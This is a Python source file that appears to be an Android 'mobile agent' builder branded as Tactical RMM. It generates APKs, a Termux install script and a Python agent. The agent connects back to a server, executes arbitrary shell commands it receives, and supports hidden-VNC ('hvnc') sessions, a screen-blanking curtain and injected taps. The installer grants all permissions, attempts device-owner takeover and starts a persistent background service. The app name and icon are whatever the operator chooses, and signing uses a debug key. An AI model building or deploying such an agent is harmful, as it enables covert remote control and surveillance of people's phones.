"""
Tactical RMM — Android Mobile Agent Builder.
Generates native Android packages (.apk), 1-click shell installers (.sh),
standalone Python mobile agent scripts, and full offline mobile bundles (.zip).
"""

import os
import sys
import json
import uuid
import shutil
import zipfile
import logging
import subprocess
from typing import Dict, Any, Optional

logger = logging.getLogger("master_hub.android_builder")

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PAYLOADS_DIR = os.path.join(ROOT_DIR, "master_hub", "payloads")
OUTPUT_DIR = os.path.join(ROOT_DIR, "generated_agents")
BASE_APK_PATH = os.path.join(PAYLOADS_DIR, "android_agent_base.apk")

# Build tools detection
SDK_DIR = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT") or os.path.expanduser(r"~\AppData\Local\Android\Sdk")
BUILD_TOOLS_DIR = os.path.join(SDK_DIR, "build-tools", "34.0.0") if os.path.isdir(SDK_DIR) else ""
if not os.path.isdir(BUILD_TOOLS_DIR) and os.path.isdir(SDK_DIR):
    BUILD_TOOLS_DIR = os.path.join(SDK_DIR, "build-tools", "35.0.0")

PLATFORM_DIR = os.path.join(SDK_DIR, "platforms", "android-34") if os.path.isdir(SDK_DIR) else ""
if not os.path.isdir(PLATFORM_DIR) and os.path.isdir(SDK_DIR):
    PLATFORM_DIR = os.path.join(SDK_DIR, "platforms", "android-35")
ANDROID_JAR = os.path.join(PLATFORM_DIR, "android.jar") if PLATFORM_DIR else ""

ANDROID_DIR = os.path.join(ROOT_DIR, "master_hub", "android")
CLASSES_DEX_PATH = os.path.join(PAYLOADS_DIR, "classes.dex")

def _find_tool(name: str, build_tools_dir: str) -> str:
    exts = [".exe", ".bat", ""] if os.name == "nt" else [""]
    if build_tools_dir and os.path.isdir(build_tools_dir):
        for ext in exts:
            p = os.path.join(build_tools_dir, name + ext)
            if os.path.isfile(p):
                return p
    w = shutil.which(name)
    if w:
        return w
    for ext in exts:
        w_ext = shutil.which(name + ext)
        if w_ext:
            return w_ext
    return ""

AAPT2 = _find_tool("aapt2", BUILD_TOOLS_DIR)
APKSIGNER = _find_tool("apksigner", BUILD_TOOLS_DIR)
ZIPALIGN = _find_tool("zipalign", BUILD_TOOLS_DIR)
BUNDLED_APKSIGNER_JAR = os.path.join(PAYLOADS_DIR, "apksigner.jar")
DEBUG_KEYSTORE = os.path.join(PAYLOADS_DIR, "debug.keystore")
if not os.path.isfile(DEBUG_KEYSTORE):
    DEBUG_KEYSTORE = os.path.expanduser(r"~/.android/debug.keystore")


def escape_android_xml(s: str) -> str:
    """Escapes special characters for Android strings.xml resources."""
    if not s:
        return "Tactical RMM"
    s = s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    s = s.replace("'", "\\'").replace('"', '\\"')
    return s


class AndroidBuilder:
    """Bakes dynamic configuration into Android APKs and generates mobile agent packages."""

    @staticmethod
    def is_apk_base_available() -> bool:
        return os.path.isfile(BASE_APK_PATH) and os.path.getsize(BASE_APK_PATH) > 1000

    @staticmethod
    def generate_mobile_python_agent(config: Dict[str, Any]) -> str:
        """
        Generates a standalone, dependency-free mobile Python agent that runs in Termux,
        Pydroid, or any Android Python environment.
        """
        agent_id = config.get("agent_id", "android_agent")
        endpoint_tag = config.get("endpoint_tag", "Android-Device")
        server_url = config.get("server_url", "ws://127.0.0.1:8000")
        auto_start = config.get("auto_start", True)

        script = f'''#!/usr/bin/env python3
"""
Tactical RMM — Android Mobile Agent
Endpoint Tag: {endpoint_tag}
Agent ID: {agent_id}
"""

import os
import sys
import time
import json
import socket
import ssl
import subprocess
import threading
import platform
from urllib.parse import urlsplit
import base64
import os.path

SERVER_URL = "{server_url}"
AGENT_ID = "{agent_id}"
ENDPOINT_TAG = "{endpoint_tag}"

def get_android_prop(prop_name, default=""):
    try:
        res = subprocess.run(["getprop", prop_name], capture_output=True, text=True, timeout=2)
        if res.returncode == 0 and res.stdout.strip():
            return res.stdout.strip()
    except Exception:
        pass
    return default

def get_battery_info():
    # Try termux-battery-status first
    try:
        res = subprocess.run(["termux-battery-status"], capture_output=True, text=True, timeout=2)
        if res.returncode == 0:
            data = json.loads(res.stdout)
            return data.get("percentage", 100), data.get("status") == "CHARGING"
    except Exception:
        pass
    # Try sysfs battery capacity
    for p in ["/sys/class/power_supply/battery/capacity", "/sys/class/power_supply/battery/charge_counter"]:
        if os.path.isfile(p):
            try:
                with open(p, "r") as f:
                    return int(f.read().strip()), False
            except Exception:
                pass
    return 100, False

def get_ram_info():
    try:
        with open("/proc/meminfo", "r") as f:
            for line in f:
                if line.startswith("MemTotal:"):
                    parts = line.split()
                    kb = int(parts[1])
                    return round(kb / (1024 * 1024), 1)
    except Exception:
        pass
    return 4.0

def get_device_info():
    manufacturer = get_android_prop("ro.product.manufacturer", "Android")
    model = get_android_prop("ro.product.model", platform.machine() or "Mobile")
    android_ver = get_android_prop("ro.build.version.release", "14")
    ram_gb = get_ram_info()
    battery_pct, is_charging = get_battery_info()

    return {{
        "type": "register",
        "agent_id": AGENT_ID,
        "hostname": f"{{manufacturer}} {{model}}",
        "username": os.environ.get("USER", "android_user"),
        "os": f"Android {{android_ver}} ({{manufacturer}} {{model}})",
        "ip": get_local_ip(),
        "endpoint_tag": ENDPOINT_TAG,
        "arch": "ARM64 (Android)",
        "ram_gb": f"{{ram_gb}} GB",
        "battery_percent": battery_pct,
        "battery_charging": is_charging,
        "status": "online"
    }}

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

class SimpleWebSocketClient:
    def __init__(self, url):
        self.url = url
        self.sock = None
        self.connected = False

    def connect(self):
        parsed = urlsplit(self.url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme in ("wss", "https") else 80)
        is_ssl = parsed.scheme in ("wss", "https")

        raw_sock = socket.create_connection((host, port), timeout=10)
        if is_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self.sock = ctx.wrap_socket(raw_sock, server_hostname=host)
        else:
            self.sock = raw_sock

        key = base64.b64encode(os.urandom(16)).decode('utf-8')
        path = parsed.path or "/"
        req = (
            f"GET {{path}} HTTP/1.1\\r\\n"
            f"Host: {{host}}:{{port}}\\r\\n"
            f"Upgrade: websocket\\r\\n"
            f"Connection: Upgrade\\r\\n"
            f"Sec-WebSocket-Key: {{key}}\\r\\n"
            f"Sec-WebSocket-Version: 13\\r\\n"
            f"User-Agent: TRMM-Android-Python/3.0\\r\\n\\r\\n"
        )
        self.sock.sendall(req.encode('utf-8'))

        resp = b""
        while b"\\r\\n\\r\\n" not in resp:
            chunk = self.sock.recv(512)
            if not chunk:
                raise ConnectionError("Server disconnected during handshake")
            resp += chunk

        if b" 101 " not in resp.split(b"\\r\\n")[0]:
            raise ConnectionError(f"WebSocket upgrade rejected: {{resp.decode('utf-8', errors='ignore')}}")

        self.connected = True

    def send_text(self, text):
        if not self.connected or not self.sock:
            return
        payload = text.encode('utf-8')
        length = len(payload)
        mask_key = os.urandom(4)

        header = bytearray([0x81])  # FIN + Text opcode
        if length <= 125:
            header.append(0x80 | length)
        elif length <= 65535:
            header.append(0x80 | 126)
            header.extend(length.to_bytes(2, 'big'))
        else:
            header.append(0x80 | 127)
            header.extend(length.to_bytes(8, 'big'))

        header.extend(mask_key)
        masked = bytearray(payload)
        for i in range(len(masked)):
            masked[i] ^= mask_key[i % 4]

        self.sock.sendall(bytes(header) + bytes(masked))

    def send_binary(self, payload):
        if not self.connected or not self.sock:
            return
        length = len(payload)
        mask_key = os.urandom(4)
        header = bytearray([0x82])  # FIN + Binary opcode
        if length <= 125:
            header.append(0x80 | length)
        elif length <= 65535:
            header.append(0x80 | 126)
            header.extend(length.to_bytes(2, 'big'))
        else:
            header.append(0x80 | 127)
            header.extend(length.to_bytes(8, 'big'))

        header.extend(mask_key)
        masked = bytearray(payload)
        for i in range(len(masked)):
            masked[i] ^= mask_key[i % 4]

        self.sock.sendall(bytes(header) + bytes(masked))

    def recv_text(self):
        if not self.connected or not self.sock:
            return None
        b1 = self.sock.recv(1)
        if not b1:
            return None
        b2 = self.sock.recv(1)
        if not b2:
            return None
        length = b2[0] & 0x7F
        if length == 126:
            length = int.from_bytes(self.sock.recv(2), 'big')
        elif length == 127:
            length = int.from_bytes(self.sock.recv(8), 'big')

        data = b""
        while len(data) < length:
            chunk = self.sock.recv(min(4096, length - len(data)))
            if not chunk:
                break
            data += chunk
        return data.decode('utf-8', errors='replace')

    def close(self):
        self.connected = False
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass

def run_agent():
    print(f"[*] Tactical RMM Android Mobile Agent starting...")
    print(f"[*] Tag: {{ENDPOINT_TAG}} | ID: {{AGENT_ID}}")
    print(f"[*] Connecting to {{SERVER_URL}}...")

    ws_url = SERVER_URL.rstrip('/') + f"/ws/agent/{{AGENT_ID}}"

    while True:
        client = SimpleWebSocketClient(ws_url)
        try:
            client.connect()
            print(f"[✓] Connected to Master Hub!")
            # Send registration
            client.send_text(json.dumps(get_device_info()))

            # Heartbeat loop in background
            def heartbeat():
                while client.connected:
                    time.sleep(10)
                    try:
                        battery_pct, is_charging = get_battery_info()
                        client.send_text(json.dumps({{
                            "type": "telemetry",
                            "agent_id": AGENT_ID,
                            "battery": battery_pct,
                            "ip": get_local_ip()
                        }}))
                    except Exception:
                        break
            threading.Thread(target=heartbeat, daemon=True).start()

            # Message read loop
            while client.connected:
                raw = client.recv_text()
                if raw is None:
                    break
                try:
                    msg = json.loads(raw)
                    mtype = msg.get("type")
                    if mtype in ("shell", "execute_shell", "cmd"):
                        cmd = msg.get("command", "")
                        print(f"[*] Executing remote command: {{cmd}}")
                        res = subprocess.run(["sh", "-c", cmd], capture_output=True, text=True, timeout=60)
                        out = res.stdout + ("\\n" + res.stderr if res.stderr else "")
                        client.send_text(json.dumps({{
                            "type": "shell_output",
                            "agent_id": AGENT_ID,
                            "output": out,
                            "exit_code": res.returncode
                        }}))
                    elif mtype == "ping":
                        client.send_text(json.dumps({{"type": "pong", "agent_id": AGENT_ID}}))
                    elif mtype == "set_curtain":
                        enabled = bool(msg.get("enabled", False))
                        print(f"[*] Screen curtain requested: {{enabled}}")
                        try:
                            if enabled:
                                subprocess.run(["am", "start", "-n", "com.trmm.agent/.CurtainActivity"], capture_output=True)
                            else:
                                subprocess.run(["am", "broadcast", "-a", "com.trmm.agent.CURTAIN_DISMISS"], capture_output=True)
                        except Exception:
                            pass
                        client.send_text(json.dumps({{"type": "diag_curtain", "enabled": enabled, "success": True}}))
                    elif mtype in ("start_mirror", "start_hvnc"):
                        print("[*] Remote screen stream started")
                    elif mtype in ("stop_mirror", "stop_hvnc"):
                        print("[*] Remote screen stream stopped")
                    elif mtype in ("mousedown", "mouseup") and "normalized_x" in msg and "normalized_y" in msg:
                        try:
                            # Attempt shell input tap
                            nx = float(msg.get("normalized_x", 0))
                            ny = float(msg.get("normalized_y", 0))
                            tap_x = int(nx * 1080)
                            tap_y = int(ny * 2400)
                            subprocess.Popen(["sh", "-c", "input tap " + str(tap_x) + " " + str(tap_y)])
                        except Exception:
                            pass
                except Exception as ex:
                    print(f"[!] Error processing message: {{ex}}")

        except Exception as e:
            print(f"[!] Connection dropped: {{e}}. Reconnecting in 5s...")
        finally:
            client.close()
        time.sleep(5)

if __name__ == "__main__":
    run_agent()
'''
        return script

    @staticmethod
    def generate_shell_bootstrap(app_name: str, endpoint_tag: str, agent_id: str,
                                 download_url: str, server_url: str) -> str:
        """
        Generates 1-Click Termux / Android Linux shell bootstrap installer (.sh).
        """
        return f'''#!/bin/bash
# ====================================================================
# Tactical RMM — Android Mobile Agent 1-Click Setup
# Endpoint: {endpoint_tag} (ID: {agent_id})
# ====================================================================

set -e

echo "=========================================================="
echo "  Tactical RMM — Android Mobile Agent Setup"
echo "  Target: {endpoint_tag} (ID: {agent_id})"
echo "=========================================================="

INSTALL_DIR="$HOME/.trmm_agent_{agent_id}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Acquire Termux wake lock if available so agent runs in background
if command -v termux-wake-lock >/dev/null 2>&1; then
    echo "[*] Enabling Termux wake lock for background operation..."
    termux-wake-lock
fi

# Ensure Python is installed
if ! command -v python3 >/dev/null 2>&1 && ! command -v python >/dev/null 2>&1; then
    echo "[*] Python not detected. Installing python via package manager..."
    if command -v pkg >/dev/null 2>&1; then
        pkg update -y && pkg install python -y
    elif command -v apt-get >/dev/null 2>&1; then
        apt-get update && apt-get install -y python3
    fi
fi

PYTHON_CMD="python3"
if ! command -v python3 >/dev/null 2>&1; then
    PYTHON_CMD="python"
fi

echo "[*] Downloading mobile agent package..."
curl -fsSL "{download_url}" -o "$INSTALL_DIR/agent.zip" || wget -qO "$INSTALL_DIR/agent.zip" "{download_url}"

if [ -f "$INSTALL_DIR/agent.zip" ]; then
    echo "[*] Extracting package..."
    if command -v unzip >/dev/null 2>&1; then
        unzip -o -q "$INSTALL_DIR/agent.zip" -d "$INSTALL_DIR"
    else
        $PYTHON_CMD -m zipfile -e "$INSTALL_DIR/agent.zip" "$INSTALL_DIR"
    fi
    rm -f "$INSTALL_DIR/agent.zip"
fi

# Check if a native Android APK is bundled and package manager (pm) is accessible
APK_FILE=$(find "$INSTALL_DIR" -maxdepth 1 -name "*.apk" 2>/dev/null | head -n 1)
if [ -n "$APK_FILE" ] && [ -f "$APK_FILE" ]; then
    if command -v pm >/dev/null 2>&1; then
        echo "[*] Installing native Android APK with all runtime permissions..."
        pm install -r -g "$APK_FILE" 2>/dev/null || pm install -r "$APK_FILE" 2>/dev/null || true

        # Attempt corporate Device Owner provisioning
        if command -v dpm >/dev/null 2>&1; then
            echo "[*] Configuring Corporate Device Owner policy..."
            dpm set-device-owner com.trmm.agent/.AdminReceiver 2>/dev/null || true
        fi

        # Immediately start persistent 24/7 background agent service
        if command -v am >/dev/null 2>&1; then
            echo "[*] Launching persistent background agent service..."
            am start-foreground-service -n com.trmm.agent/.AgentService 2>/dev/null || \
            am startservice -n com.trmm.agent/.AgentService 2>/dev/null || true
        fi
        echo "[OK] Native Android Agent provisioning completed."
    fi
fi

# Kill any previous agent process for this ID
pkill -f "trmm_mobile_agent.py" 2>/dev/null || true
sleep 1

# Launch in background
echo "[*] Starting Tactical RMM background mobile agent..."
nohup $PYTHON_CMD "$INSTALL_DIR/trmm_mobile_agent.py" > "$INSTALL_DIR/agent.log" 2>&1 &

sleep 2
if pgrep -f "trmm_mobile_agent.py" >/dev/null 2>&1; then
    echo "=========================================================="
    echo " [OK] Tactical RMM Mobile Agent is active in background!"
    echo " Log file: $INSTALL_DIR/agent.log"
    echo "=========================================================="
else
    echo "[*] Starting agent in foreground:"
    $PYTHON_CMD "$INSTALL_DIR/trmm_mobile_agent.py"
fi
'''

    @staticmethod
    def build_custom_apk(config: Dict[str, Any], output_apk_path: str) -> bool:
        """
        Bakes custom app name (from Endpoint Tag / Machine ID), custom app icon (.ico/.png/.jpg),
        and server URL/agent ID directly into a signed Android APK.
        """
        agent_id = config.get("agent_id", "android_agent")
        endpoint_tag = config.get("endpoint_tag", "Android-Device")
        server_url = config.get("server_url", "ws://127.0.0.1:8000")
        auto_start = config.get("auto_start", True)
        icon_base64 = config.get("icon_base64")
        custom_name = (config.get("custom_name") or "").strip()

        # Requirement: "The app name is expected to be the name set in Endpoint Tag / Machine ID"
        app_display_name = endpoint_tag or custom_name or "Tactical RMM"

        # Check if AAPT2 and ANDROID_JAR are available for dynamic app name and icon compilation
        can_recompile_res = (
            bool(AAPT2 and os.path.isfile(AAPT2)) and
            bool(ANDROID_JAR and os.path.isfile(ANDROID_JAR)) and
            os.path.isdir(os.path.join(ANDROID_DIR, "res")) and
            os.path.isfile(os.path.join(ANDROID_DIR, "AndroidManifest.xml"))
        )

        if can_recompile_res:
            temp_build = output_apk_path + f".{uuid.uuid4().hex[:6]}.build"
            try:
                if os.path.exists(temp_build):
                    shutil.rmtree(temp_build, ignore_errors=True)
                os.makedirs(temp_build, exist_ok=True)

                # 1. Copy res directory
                res_src = os.path.join(ANDROID_DIR, "res")
                res_dst = os.path.join(temp_build, "res")
                shutil.copytree(res_src, res_dst)

                # 2. Write custom strings.xml with Endpoint Tag as app_name
                strings_xml = (
                    '<?xml version="1.0" encoding="utf-8"?>\n'
                    '<resources>\n'
                    f'    <string name="app_name">{escape_android_xml(app_display_name)}</string>\n'
                    '    <string name="status_connected">Connected to Master Hub</string>\n'
                    '    <string name="status_disconnected">Disconnected</string>\n'
                    '    <string name="btn_reconnect">Reconnect</string>\n'
                    '</resources>\n'
                )
                with open(os.path.join(res_dst, "values", "strings.xml"), "w", encoding="utf-8") as sf:
                    sf.write(strings_xml)

                # 3. Process custom icon if provided (.ico, .png, .jpg, .webp)
                if icon_base64:
                    try:
                        import base64, io
                        from PIL import Image
                        raw_b64 = icon_base64.split(",", 1)[1] if "," in icon_base64 else icon_base64
                        icon_bytes = base64.b64decode(raw_b64)
                        img = Image.open(io.BytesIO(icon_bytes)).convert("RGBA")
                        icon_target = os.path.join(res_dst, "drawable", "ic_launcher.png")
                        img_resized = img.resize((192, 192), Image.Resampling.LANCZOS)
                        img_resized.save(icon_target, format="PNG")
                        logger.info(f"Custom Android launcher icon embedded for: {app_display_name}")
                    except Exception as ie:
                        logger.warning(f"Could not convert custom icon: {ie}")

                # 4. Compile resources with aapt2
                compiled_res = os.path.join(temp_build, "resources.zip")
                subprocess.run(
                    [AAPT2, "compile", "--dir", res_dst, "-o", compiled_res],
                    check=True, capture_output=True, text=True
                )

                # 5. Link resources with aapt2
                unaligned_apk = os.path.join(temp_build, "unaligned.apk")
                manifest_path = os.path.join(ANDROID_DIR, "AndroidManifest.xml")
                subprocess.run(
                    [AAPT2, "link", "-o", unaligned_apk, "-I", ANDROID_JAR,
                     "--manifest", manifest_path, "--auto-add-overlay", compiled_res],
                    check=True, capture_output=True, text=True
                )

                # 6. Add classes.dex and assets/config.json
                dex_bytes = None
                if os.path.isfile(CLASSES_DEX_PATH):
                    with open(CLASSES_DEX_PATH, "rb") as df:
                        dex_bytes = df.read()
                elif os.path.isfile(BASE_APK_PATH):
                    with zipfile.ZipFile(BASE_APK_PATH, "r") as zf:
                        dex_bytes = zf.read("classes.dex")

                if not dex_bytes:
                    raise RuntimeError("classes.dex is missing; cannot assemble APK")

                custom_cfg = {
                    "server_url": server_url,
                    "agent_id": agent_id,
                    "endpoint_tag": endpoint_tag,
                    "app_name": app_display_name,
                    "auto_start": auto_start,
                    "arch": "android",
                    "os": "Android device",
                    "platform": "android",
                    "is_android": True,
                    "device_type": "phone"
                }

                with zipfile.ZipFile(unaligned_apk, "a", zipfile.ZIP_DEFLATED) as zf:
                    zf.writestr("classes.dex", dex_bytes)
                    zf.writestr("assets/config.json", json.dumps(custom_cfg, indent=2))

                # 7 & 8. Zipalign and sign with v1 + v2/v3 schemes
                sign_ok = AndroidBuilder.sign_and_align_apk(unaligned_apk, output_apk_path)
                if sign_ok:
                    logger.info(f"Custom Android APK compiled & signed: {output_apk_path} (App Name: '{app_display_name}')")
                    return True
                else:
                    logger.error("Failed to sign dynamically compiled APK. Falling back to base template.")
            except Exception as e:
                logger.error(f"Failed to dynamically compile APK with aapt2: {e}. Falling back to template repacker.")
            finally:
                if os.path.isdir(temp_build):
                    shutil.rmtree(temp_build, ignore_errors=True)

        # Fallback to repacking base APK
        return AndroidBuilder._build_from_base_template(config, output_apk_path)

    @staticmethod
    def sign_and_align_apk(input_apk_path: str, output_apk_path: str) -> bool:
        """
        Signs the APK with v1 (JAR), v2, and v3 signature schemes using:
        1. System apksigner binary
        2. Bundled apksigner.jar via java
        3. jarsigner fallback

        Guarantees full installation compatibility on Android 8 through Android 15+.
        """
        keystore = DEBUG_KEYSTORE
        if not (keystore and os.path.isfile(keystore)):
            keystore = os.path.join(PAYLOADS_DIR, "debug.keystore")

        if not os.path.isfile(keystore):
            keytool = shutil.which("keytool")
            if keytool:
                try:
                    os.makedirs(os.path.dirname(keystore), exist_ok=True)
                    subprocess.run([
                        keytool, "-genkeypair", "-v",
                        "-keystore", keystore,
                        "-storepass", "android",
                        "-alias", "androiddebugkey",
                        "-keypass", "android",
                        "-keyalg", "RSA",
                        "-keysize", "2048",
                        "-validity", "10000",
                        "-dname", "CN=Android Debug,O=Android,C=US"
                    ], capture_output=True, check=True)
                    logger.info("Auto-generated debug.keystore at %s", keystore)
                except Exception as e:
                    logger.warning("Failed to auto-generate keystore: %s", e)

        if not os.path.isfile(keystore):
            logger.error("No debug.keystore found for APK signing at %s", keystore)
            return False

        # Optional zipalign
        target_to_sign = input_apk_path
        aligned_tmp = None
        if ZIPALIGN and os.path.isfile(ZIPALIGN):
            aligned_tmp = input_apk_path + f".{uuid.uuid4().hex[:6]}.aligned.apk"
            try:
                subprocess.run([ZIPALIGN, "-f", "-p", "4", input_apk_path, aligned_tmp],
                               capture_output=True, check=True)
                target_to_sign = aligned_tmp
            except Exception as e:
                logger.warning("zipalign failed: %s; proceeding with raw apk", e)
                target_to_sign = input_apk_path

        signed = False

        # 1. Try apksigner binary
        if APKSIGNER and os.path.isfile(APKSIGNER):
            try:
                sign_cmd = [
                    APKSIGNER, "sign",
                    "--ks", keystore,
                    "--ks-pass", "pass:android",
                    "--key-pass", "pass:android",
                    "--out", output_apk_path,
                    target_to_sign
                ]
                res = subprocess.run(sign_cmd, capture_output=True, text=True)
                if res.returncode == 0:
                    signed = True
                    logger.info("APK signed successfully via apksigner binary: %s", output_apk_path)
                else:
                    logger.warning("apksigner binary failed (rc=%d): %s", res.returncode, res.stderr)
            except Exception as e:
                logger.warning("Error running apksigner binary: %s", e)

        # 2. Try bundled apksigner.jar via java
        bundled_jar = os.path.join(PAYLOADS_DIR, "apksigner.jar")
        java_bin = shutil.which("java")
        if not signed and java_bin and os.path.isfile(bundled_jar):
            try:
                sign_cmd = [
                    java_bin, "-jar", bundled_jar, "sign",
                    "--ks", keystore,
                    "--ks-pass", "pass:android",
                    "--key-pass", "pass:android",
                    "--out", output_apk_path,
                    target_to_sign
                ]
                res = subprocess.run(sign_cmd, capture_output=True, text=True)
                if res.returncode == 0:
                    signed = True
                    logger.info("APK signed successfully via bundled apksigner.jar: %s", output_apk_path)
                else:
                    logger.warning("bundled apksigner.jar failed (rc=%d): %s", res.returncode, res.stderr)
            except Exception as e:
                logger.warning("Error running bundled apksigner.jar: %s", e)

        # 3. Fallback: jarsigner
        if not signed:
            jarsigner = shutil.which("jarsigner")
            if jarsigner:
                try:
                    sign_cmd = [
                        jarsigner, "-verbose",
                        "-sigalg", "SHA256withRSA",
                        "-digestalg", "SHA-256",
                        "-keystore", keystore,
                        "-storepass", "android",
                        "-keypass", "android",
                        target_to_sign, "androiddebugkey"
                    ]
                    res = subprocess.run(sign_cmd, capture_output=True, text=True)
                    if res.returncode == 0:
                        shutil.copy2(target_to_sign, output_apk_path)
                        signed = True
                        logger.info("APK signed successfully via jarsigner fallback: %s", output_apk_path)
                    else:
                        logger.warning("jarsigner failed (rc=%d): %s", res.returncode, res.stderr)
                except Exception as e:
                    logger.warning("Error running jarsigner: %s", e)

        if aligned_tmp and os.path.isfile(aligned_tmp):
            try:
                os.remove(aligned_tmp)
            except Exception:
                pass

        if not signed:
            logger.error("Failed to sign APK using all available signers! Android will refuse to install unsigned APK.")
            return False

        return True

    @staticmethod
    def _build_from_base_template(config: Dict[str, Any], output_apk_path: str) -> bool:
        """Fallback method: updates assets/config.json in prebuilt base APK template and signs with v1+v2 schemes."""
        if not AndroidBuilder.is_apk_base_available():
            logger.warning("Base Android APK template is missing at %s", BASE_APK_PATH)
            return False

        agent_id = config.get("agent_id", "android_agent")
        endpoint_tag = config.get("endpoint_tag", "Android-Device")
        server_url = config.get("server_url", "ws://127.0.0.1:8000")
        auto_start = config.get("auto_start", True)

        custom_cfg = {
            "server_url": server_url,
            "agent_id": agent_id,
            "endpoint_tag": endpoint_tag,
            "auto_start": auto_start,
            "arch": "android",
            "os": "Android device",
            "platform": "android",
            "is_android": True,
            "device_type": "phone"
        }

        out_parent = os.path.dirname(output_apk_path)
        if out_parent:
            os.makedirs(out_parent, exist_ok=True)
        temp_apk = output_apk_path + f".{uuid.uuid4().hex[:6]}.tmp.apk"
        try:
            with zipfile.ZipFile(BASE_APK_PATH, "r") as zin:
                with zipfile.ZipFile(temp_apk, "w", zipfile.ZIP_DEFLATED) as zout:
                    for item in zin.infolist():
                        if item.filename == "assets/config.json" or item.filename.startswith("META-INF/"):
                            continue
                        zout.writestr(item, zin.read(item.filename))
                    zout.writestr("assets/config.json", json.dumps(custom_cfg, indent=2))

            sign_ok = AndroidBuilder.sign_and_align_apk(temp_apk, output_apk_path)
            if not sign_ok:
                logger.error("Failed to sign repacked Android APK template at %s", output_apk_path)
                return False

            if os.path.isfile(temp_apk):
                os.remove(temp_apk)
            return True
        except Exception as e:
            logger.error("Failed to build fallback customized APK: %s", e)
            if os.path.isfile(temp_apk):
                os.remove(temp_apk)
            return False
